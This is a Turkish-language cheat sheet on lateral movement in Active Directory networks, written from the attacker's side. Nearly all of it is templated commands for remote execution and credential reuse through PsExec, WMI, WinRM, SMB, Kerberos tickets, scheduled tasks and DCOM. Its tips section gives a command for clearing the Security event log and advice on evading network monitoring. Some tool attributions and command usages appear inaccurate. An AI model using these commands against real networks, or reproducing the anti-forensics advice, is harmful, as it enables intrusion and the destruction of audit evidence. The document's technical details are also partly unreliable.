# Active Directory Lateral Movement Rehberi

Bu rehberde, Active Directory (AD) ortamlarında Lateral Movement (Yatay Hareket) safhasında kullanılan tüm yöntemler ve komutlar detaylı olarak açıklanmıştır. Her bir yöntemin ne işe yaradığı ve nasıl kullanıldığı da dahil edilmiştir.

## 1. Giriş

Lateral Movement, bir saldırganın bir kullanıcı hesabını veya sistem erişimini kullanarak ağ içinde hareket ettiği aşamadır. Bu süreç, daha yüksek ayrıcalıklara sahip sistemlere veya hassas bilgilere erişim sağlamak için kritik öneme sahiptir. AD ortamlarında Lateral Movement için çeşitli araçlar, komutlar ve teknikler kullanılır.

---

## 2. Lateral Movement Teknikleri ve Komutları

### 2.1. PsExec Kullanımı

#### `PsExec`
**Amaç:** Uzak bir sistemde komut çalıştırmak.

```cmd
PsExec.exe \\<hedef_IP> -u <kullanıcı_adı> -p <şifre> cmd
```

#### `Invoke-Command`
**Amaç:** PowerShell üzerinden uzak bir sistemde komut çalıştırmak.

```powershell
Invoke-Command -ComputerName <hedef_IP> -ScriptBlock { <komut> } -Credential <kullanıcı_adı>
```

---

### 2.2. WMI (Windows Management Instrumentation) Kullanımı

#### `wmic`
**Amaç:** WMI kullanarak uzaktaki bir sistemde komut çalıştırmak.

```cmd
wmic /node:<hedef_IP> /user:<kullanıcı_adı> process call create "<komut>"
```

#### `Invoke-WmiMethod`
**Amaç:** PowerShell kullanarak WMI üzerinden komut çalıştırmak.

```powershell
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "<komut>" -ComputerName <hedef_IP> -Credential <kullanıcı_adı>
```

---

### 2.3. Remote Desktop Protocol (RDP) Kullanımı

#### `mstsc`
**Amaç:** RDP kullanarak uzak bir sisteme bağlanmak.

```cmd
mstsc /v:<hedef_IP>
```

#### `xfreerdp`
**Amaç:** FreeRDP ile uzak bir sisteme bağlanmak.

```bash
xfreerdp /u:<kullanıcı_adı> /p:<şifre> /v:<hedef_IP>
```

---

### 2.4. SMB Üzerinden Hareket

#### `net use`
**Amaç:** SMB paylaşımına bağlanmak.

```cmd
net use \\\\<hedef_IP>\C$ /user:<kullanıcı_adı> <şifre>
```

#### `Impacket-Psexec`
**Amaç:** SMB kullanarak uzak sistemde komut çalıştırmak.

```bash
python3 psexec.py <domain>/<kullanıcı_adı>:<şifre>@<hedef_IP>
```

---

### 2.5. WinRM (Windows Remote Management) Kullanımı

#### `Evil-WinRM`
**Amaç:** WinRM kullanarak hedef sistemde shell almak.

```bash
evil-winrm -i <hedef_IP> -u <kullanıcı_adı> -p <şifre>
```

#### `Invoke-Command`
**Amaç:** WinRM üzerinden PowerShell komutları çalıştırmak.

```powershell
Invoke-Command -ComputerName <hedef_IP> -Credential <kullanıcı_adı> -ScriptBlock { <komut> }
```

---

### 2.6. Kerberos Delegasyonu ve Pass-The-Ticket

#### `Rubeus` (Kerberos Bilet Yönetimi)
**Amaç:** Kerberos biletlerini dump etmek ve yeniden kullanmak.

```bash
Rubeus.exe tgtdeleg /ticket:<base64_bilet>
```

#### `klist`
**Amaç:** Kerberos biletlerini görüntülemek.

```cmd
klist
```

---

### 2.7. Scheduled Tasks Kullanımı

#### `schtasks`
**Amaç:** Uzak sistemde zamanlanmış görev oluşturmak.

```cmd
schtasks /create /s <hedef_IP> /u <kullanıcı_adı> /p <şifre> /tn <görev_adı> /tr "<komut>" /sc once /st <zaman>
```

#### `Invoke-ScheduledTask`
**Amaç:** PowerShell kullanarak zamanlanmış görev çalıştırmak.

```powershell
Invoke-ScheduledTask -TaskName <görev_adı> -ComputerName <hedef_IP>
```

---

### 2.8. PowerShell Remoting

#### `Enable-PSRemoting`
**Amaç:** PowerShell Remoting özelliğini etkinleştirmek.

```powershell
Enable-PSRemoting -Force
```

#### `Enter-PSSession`
**Amaç:** Hedef sisteme PowerShell oturumu başlatmak.

```powershell
Enter-PSSession -ComputerName <hedef_IP> -Credential <kullanıcı_adı>
```

---

### 2.9. DCOM (Distributed Component Object Model) Kullanımı

#### `MMC20.Application`
**Amaç:** DCOM kullanarak uzak sistemde komut çalıştırmak.

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "<hedef_IP>"))
$com.Document.ActiveView.ExecuteShellCommand("<komut>", $null, $null, "7")
```

---

### 2.10. PowerSploit ve Nishang Kullanımı

#### PowerSploit `Invoke-SMBExec`
**Amaç:** SMB üzerinden komut çalıştırmak.

```powershell
Invoke-SMBExec -Target <hedef_IP> -Command "<komut>" -Credential <kullanıcı_adı>
```

#### Nishang `Invoke-WMIExec`
**Amaç:** WMI üzerinden komut çalıştırmak.

```powershell
Invoke-WMIExec -Target <hedef_IP> -Command "<komut>" -Credential <kullanıcı_adı>
```

---

## 3. Öneriler ve İpuçları

1. **Logları Temizle:** Hedef sistemdeki hareketlerinizi gizlemek için logları temizlemeyi unutmayın.
   ```cmd
   wevtutil cl Security
   ```
2. **Kimlik Bilgilerini Güvende Tutun:** Kullanılan kimlik bilgilerini kimseyle paylaşmayın ve güvenli bir yerde saklayın.
3. **Network İzlemeyi Kullanın:** Ağ trafiğini izleyerek hareketlerinizin tespit edilmesini önlemek için proxy veya tünelleme araçlarını kullanın.

---

## 4. Sonuç

Bu rehber, Active Directory ortamlarında Lateral Movement safhasında kullanılan en popüler yöntem ve araçları kapsamaktadır. Doğru araçları ve komutları seçmek, ağ içinde sessiz ve etkili bir şekilde hareket etmenizi sağlayacaktır.
